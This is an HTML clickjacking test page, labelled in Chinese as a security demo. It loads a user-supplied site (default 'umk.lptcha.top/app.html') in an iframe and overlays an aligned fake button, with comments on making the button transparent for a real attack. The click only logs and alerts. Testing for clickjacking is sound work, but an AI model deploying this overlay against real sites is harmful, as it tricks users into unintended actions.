<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>点击劫持安全测试演示</title>
    <style>
        body {
            font-family: 'Microsoft YaHei', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 0;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
            flex-direction: column;
        }
        .main-content {
            width: 90%;
            max-width: 1000px;
            height: 80vh;
            position: relative;
            background-color: #ffffff;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        .logs-container {
            margin-top: 20px;
            width: 90%;
            max-width: 1000px;
        }
        .interaction-logs {
            padding: 15px;
            background-color: #333;
            color: #0f0;
            font-family: monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            height: 150px;
            overflow-y: auto;
            border-radius: 5px;
            border: 1px solid #444;
        }
        .interaction-logs h3 { margin-top: 0; color: #0f0; }

        .target-iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
            z-index: 1;
            border-radius: 10px;
        }

        /* --- 点击劫持覆盖层样式 (关键修改) --- */
        .clickjacking-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
            /* 关键点1：让整个覆盖层对鼠标事件“隐形” */
            pointer-events: none;
        }

        /* 这个容器现在只是为了结构清晰，本身也是“可穿透”的 */
        .overlay-dialog {
            width: 100%;
            height: 100%;
            position: relative;
        }

        /* 这是我们的攻击按钮，我们将恢复它的点击能力 */
        .fixed-attack-button {
            position: absolute;
            /* 关键点2：只让这个按钮可以被点击 */
            pointer-events: auto;
            cursor: pointer;

            /* 将其设置为完全透明，用于真实攻击 */
            opacity: 1;

            /* --- 以下是用于调试的样式，您可以临时打开来对齐按钮 --- */
            /* background-color: rgba(255, 0, 0, 0.5); */ /* 半透明红色背景 */
            /* border: 2px solid blue; */                /* 蓝色边框 */

            /* 您需要使用开发者工具来确定这些值，以覆盖目标按钮 */
            top: 460px;
            left: 16px;
            width: 380px;
            height: 48px;
        }

    </style>
</head>
<body>

<div class="main-content">
    <iframe id="targetIframe" class="target-iframe" src="" title="目标网站内容"></iframe>
    <div id="clickjackingOverlay" class="clickjacking-overlay">
        <div class="overlay-dialog">
            <button id="fakeSubmitButton" class="fixed-attack-button"></button>
        </div>
    </div>
</div>

<div class="logs-container">
    <div class="interaction-logs">
        <h3>前端交互日志:</h3>
        <pre id="interactionLog">等待操作...</pre>
    </div>
</div>

<script>
    // --- (JavaScript部分与之前相同，无需修改) ---
    const logElement = document.getElementById('interactionLog');
    function log(message) {
        console.log(message);
        const time = new Date().toLocaleTimeString();
        logElement.textContent += `\n[${time}] ${message}`;
        logElement.scrollTop = logElement.scrollHeight;
    }

    function initializePage() {
        log('页面加载完成。');
        const iframeUrlPrompt = prompt("请输入您希望测试的网站 URL：", "https://umk.lptcha.top/app.html");
        const iframeElement = document.getElementById('targetIframe');
        if (iframeUrlPrompt) {
            iframeElement.src = iframeUrlPrompt;
            log(`Iframe 目标已设置为: ${iframeUrlPrompt}`);
        } else {
            log('用户取消了输入，iframe 为空。');
        }
        attachAttackListener();
    }

    function attachAttackListener() {
        const overlay = document.getElementById('clickjackingOverlay');
        const fakeButton = document.getElementById('fakeSubmitButton');
        if (!overlay || !fakeButton) {
            log('错误：无法找到覆盖层或假按钮。');
            return;
        }
        fakeButton.addEventListener('click', function() {
            log('劫持成功！您点击了位于顶层的假按钮。');
            alert('点击劫持成功！');
            log('正在移除劫持覆盖层...');
            overlay.remove();
            log('覆盖层已移除。');
        }, { once: true });
    }

    window.addEventListener('load', initializePage);
</script>

</body>
</html>
